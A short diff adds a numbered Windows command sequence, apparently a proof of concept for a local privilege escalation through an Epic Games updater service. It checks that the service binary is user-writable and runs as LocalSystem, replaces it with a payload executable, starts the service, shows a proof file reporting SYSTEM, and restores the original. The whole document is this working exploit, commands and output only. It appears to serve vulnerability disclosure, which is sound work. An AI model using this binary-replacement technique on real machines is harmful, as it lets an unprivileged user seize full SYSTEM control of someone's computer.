@@ -1,0 +1,16 @@
+1. icacls "C:\Program Files\Epic Games\...\EpicGamesUpdater.exe"
+   → Output: STATION\user:(I)(F)
+
+2. sc qc EpicGamesUpdater
+   → Shows: SERVICE_START_NAME: LocalSystem
+
+3. copy "...\EpicGamesUpdater.exe" "%TEMP%\backup.exe"
+
+4. copy /Y payload.exe "...\EpicGamesUpdater.exe"
+
+5. sc start EpicGamesUpdater
+
+6. type C:\Users\Public\epic_lpe_proof.txt
+   → Shows: Username: SYSTEM
+
+7. copy /Y "%TEMP%\backup.exe" "...\EpicGamesUpdater.exe"
